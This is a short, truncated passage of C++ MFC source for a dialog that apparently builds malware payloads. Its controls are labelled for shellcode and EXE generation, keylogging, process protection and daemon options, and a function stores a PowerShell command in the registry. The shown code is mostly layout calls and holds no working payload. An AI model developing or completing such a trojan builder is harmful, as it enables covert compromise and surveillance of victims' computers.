...
void CBuildDlg::OnInitialUpdate()
{
	...
	if (!binit)
	{
		...
		//配置
		SetResize(IDC_STATIC4, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_EDIT_FIRST_TIME, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_STATIC2, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_EDIT_REST_TIME, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);



		SetResize(IDC_STATIC9, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_EDIT8_G, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_STATIC8, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_EDIT_V, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_STATIC7, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_EDIT_DLL, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);

		SetResize(IDC_CHECK_KEYBOARD, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_CHECK_PROTEXTEDPROCESS, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_CHECK_NET, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_CHECK_PROCESSDAEMON, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_CHECK_PUPPET, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);

		SetResize(IDC_BUILD_SHELLCODE, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_BUILD_EXE, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		...
		SetResize(IDC_STATIC_DLLTOSHELLCODE, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_TOPLEFT);
...
void CBuildDlg::Writepowershellcmd()
{
	...
	if (ERROR_SUCCESS == ::RegCreateKey(HKEY_CURRENT_USER, ((CQuickApp*)AfxGetApp())->g_Exename.GetBuffer(), &hKey))
	{
		/*	if (ERROR_SUCCESS != ::RegSetValueEx(hKey, _T("IpDatepowershellcmdsize"), 0, REG_DWORD, (const byte*)&powershellsize, 4))
			{
